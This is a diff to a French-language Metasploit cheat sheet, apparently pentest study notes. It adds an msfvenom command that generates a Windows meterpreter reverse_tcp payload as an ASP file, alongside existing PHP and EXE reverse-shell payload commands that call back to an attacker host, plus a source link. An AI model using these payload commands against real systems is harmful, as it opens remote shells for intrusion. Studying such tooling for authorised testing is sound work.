@@ -174,9 +174,13 @@ Pour créer un payload *php/meterpreter* en reverse tcp sur le port 4444 :
 ```
 # msfvenom -p php/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f raw > payload.php
 ```
-### windows (meterpreter)
+### windows exe (meterpreter)
 ```
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > shell.exe
+```
+### windows asp (meterpreter)
+```
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f asp > shell.asp
 ```
 
 ## Sources
@@ -184,3 +188,4 @@ Pour créer un payload *php/meterpreter* en reverse tcp sur le port 4444 :
 * https://www.ehacking.net/2011/11/how-to-use-openvas-in-metasploit.html
 * https://www.offensive-security.com/metasploit-unleashed/using-databases/
 * https://netsec.ws/?p=331
+* https://dotweak.com/fr/2019/08/12/comment-creer-un-payload-metasploit-60545791/
